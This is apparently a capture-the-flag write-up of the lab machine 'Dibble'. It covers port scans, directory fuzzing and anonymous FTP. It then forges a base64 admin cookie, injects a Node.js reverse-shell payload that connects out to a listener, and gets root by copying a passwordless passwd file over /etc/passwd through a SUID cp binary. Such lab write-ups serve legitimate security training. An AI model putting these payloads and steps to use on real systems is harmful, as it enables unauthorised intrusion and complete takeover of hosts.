---
layout: post
title: PG | Dibble
subtitle: A good tool for making holes with. Careful you don't stick yourself!
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 07:36 UTC
Nmap scan report for 192.168.182.110
Host is up (0.014s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9d:3f:eb:1b:aa:9c:1e:b1:30:9b:23:53:4b:cf:59:75 (RSA)
|   256 cd:dc:05:e6:e3:bb:12:33:f7:09:74:50:12:8a:85:64 (ECDSA)
|_  256 a0:90:1f:50:78:b3:9e:41:2a:7f:5c:6f:4d:0e:a1:fa (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
|_http-server-header: Apache/2.4.46 (Fedora)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-title: Home | Hacking Articles
|_http-generator: Drupal 9 (https://www.drupal.org)
3000/tcp  open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
27017/tcp open  mongodb MongoDB 4.2.9
| mongodb-info: 
|   MongoDB Build info
|     bits = 64
|     ok = 1.0
|     openssl
|       running = OpenSSL 1.0.1e-fips 11 Feb 2013
|       compiled = OpenSSL 1.0.1e-fips 11 Feb 2013
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.76 seconds
~~~

# Service Enumeration

## FTP (TCP/21)

The target machine is running an FTP server, after authenticating and exiting passive mode there were no available files on the FTP server.

~~~shell
┌──(kali㉿kali)-[~/Desktop/Dibble]
└─$ ftp anonymous@192.168.182.110
Connected to 192.168.182.110.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
~~~

## HTTP (TCP/80)
The target machine is running an Apache web server on port 80 displaying a blog for hacking articles

![Dibble](/assets/img/DibblePG(1).png)

I started by running a FFUF sub-directory scan and identified a long list of web pages including a /user/login page, a search page and a contact page that all take user input.

~~~shell
┌──(kali㉿kali)-[~/Desktop/Dibble]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.182.110/FUZZ -fs 13655

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.182.110/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13655
________________________________________________

contact                 [Status: 200, Size: 8187, Words: 690, Lines: 138, Duration: 164ms]
search                  [Status: 302, Size: 382, Words: 60, Lines: 12, Duration: 210ms]
themes                  [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 14ms]
modules                 [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 12ms]
user                    [Status: 302, Size: 378, Words: 60, Lines: 12, Duration: 101ms]
admin                   [Status: 403, Size: 4306, Words: 414, Lines: 109, Duration: 128ms]
sites                   [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 11ms]
Search                  [Status: 302, Size: 382, Words: 60, Lines: 12, Duration: 139ms]
Contact                 [Status: 200, Size: 8187, Words: 690, Lines: 138, Duration: 151ms]
core                    [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 18ms]
profiles                [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 11ms]
vendor                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 18ms]
User                    [Status: 302, Size: 378, Words: 60, Lines: 12, Duration: 144ms]
Admin                   [Status: 403, Size: 4306, Words: 414, Lines: 109, Duration: 115ms]
batch                   [Status: 403, Size: 4306, Words: 414, Lines: 109, Duration: 499ms]
SEARCH                  [Status: 302, Size: 382, Words: 60, Lines: 12, Duration: 342ms]
CONTACT                 [Status: 200, Size: 8187, Words: 690, Lines: 138, Duration: 1187ms]
~~~

As identified in the nmap scan the target is hosting a MongoDB server, so we can assume that this website may be connected to the database, and therefore can attempt an SQL injection on each parameter, however after attempting SQL injections on all front facing input parameters they seem to be getting sanitized on the back-end.

![Dibble](/assets/img/DibblePG(2).png)

The admin sub-directory is also returning a 403 Access denied page.

## HTTP (TCP/3000)

Port 3000 is also running a webserver using Node.js JavaScript based web application.

Navigating through the website we are able to register a user account via /auth/register, and then log into the user account.

![Dibble](/assets/img/DibblePG(3).png)

After logging in we find a sub-page /logs/all that shows a series of event logs stored by the web server, this can potentially be our foothold if we are able to store a reverse shell and then access the event log to execute it.

![Dibble](/assets/img/DibblePG(4).png)

Under the 'New Event Log' page we then attempt to test the parameters of the website and when trying to'Register a new log event' we are denied

![Dibble](/assets/img/DibblePG(5).png)

In order to perform a new log event we will need to impersonate an admin account, when inspecting the cookies we find a 'userLevel' encoded cookie

![Dibble](/assets/img/DibblePG(6).png)

Running the cookie through the Burp Decoder we identify the value is 'default' which is encoded in base64 then URL

![Dibble](/assets/img/DibblePG(7).png)

We manipulate the value 'default' and replace it with 'admin' base64 encoded to YWRtaW4= and then replace the userLevel value with our new cookie

![Dibble](/assets/img/DibblePG(8).png)

When attempting to create a 'New Event Log' with our new admin userLevel cookie it works!

![Dibble](/assets/img/DibblePG(9).png)

We now need to attempt to upload a reverse shell compatible with Node.js and with the assistance of [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) we have one

~~~javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
~~~

We start a netcat listener on port 21
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 21
listening on [any] 21 ...
~~~

Then upload our Node.js reverse shell via Registering a new log event

![Dibble](/assets/img/DibblePG(10).png)

And we recieve our shell, and get our foothold!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.182.110] 42440
whoami
benjamin
~~~

# Privilege Escalation

I began enumerating for a path for Privilege Escalation by running linpeas.sh and identified the SUID bit is set on the 'cp' binary used to copy / replace files

![Dibble](/assets/img/DibblePG(11).png)

I then manually verified the SUID bit by running find / -perm -u=s -type f 2>/dev/null in which /usr/bin/cp appeared again

With assistance from this [article](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/) I exploited a privilege escalaton root that uses the 'cp' binary 
to replacing the current /etc/passwd file on the target host with our own manipulated passwd file to either add a user account with root privileges or remove the root accounts password altogether

I started by displaying the current /etc/passwd file on the target host as shown below, then created a copy locally on my attack machine

~~~shell
sh-5.0$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
systemd-timesync:x:998:996:systemd Time Synchronization:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:996:993::/var/lib/chrony:/sbin/nologin
benjamin:x:1000:1000::/home/benjamin:/bin/bash
mongod:x:995:992:mongod:/var/lib/mongo:/bin/false
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
~~~

After creating the copy I manipulated the root account parameters and removed the 'x' parameter in the root user account which represents the root's password

![Dibble](/assets/img/DibblePG(12).png)

I then transferred the newly manipulated passwd file to the target host

Create web server
~~~shell
┌──(kali㉿kali)-[~/Desktop/Dibble]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Transfer the passwd file to the target host
~~~shell
sh-5.0$ wget http://192.168.45.228/passwd

--2023-10-26 09:30:57--  http://192.168.45.228/passwd
Connecting to 192.168.45.228:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1336 (1.3K) [application/octet-stream]
Saving to: ‘passwd’

passwd              100%[===================>]   1.30K  --.-KB/s    in 0s      

2023-10-26 09:30:57 (383 MB/s) - ‘passwd’ saved [1336/1336]
~~~

Lastly I used the 'cp' binary to replace the existing /etc/passwd with our malicious passwd file

~~~shell
sh-5.0$ cp passwd /etc/passwd
~~~

Finally we can elevate privileges to root (it will no longer prompt for a password for root as we have removed the 'x' parameter in the /etc/passwd file)

![Dibble](/assets/img/DibblePG(13).png)